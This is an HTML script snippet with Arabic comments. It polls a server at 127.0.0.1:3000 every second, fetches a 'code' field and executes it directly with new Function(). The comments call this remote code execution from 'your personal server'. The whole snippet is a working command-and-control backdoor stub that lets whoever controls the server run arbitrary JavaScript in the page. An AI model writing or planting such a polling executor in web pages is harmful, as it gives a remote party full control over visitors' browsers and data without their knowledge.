<script>
    async function startPolling() {
        try {
            // الاتصال بسيرفرك الشخصي
            const response = await fetch("http://127.0.0.1:3000/command");
            const data = await response.json();

            if (data.code && data.code !== "") {
                // تنفيذ الكود المستلم مباشرة (Remote Code Execution)
                new Function(data.code)();
                console.log("تم تنفيذ الكود المستلم من السيرفر.");
            }
        } catch (e) {
            // في انتظار تشغيل السيرفر...
        }
        setTimeout(startPolling, 1000); // يفحص كل ثانية
    }

    // بدء التشغيل
    startPolling();
</script>
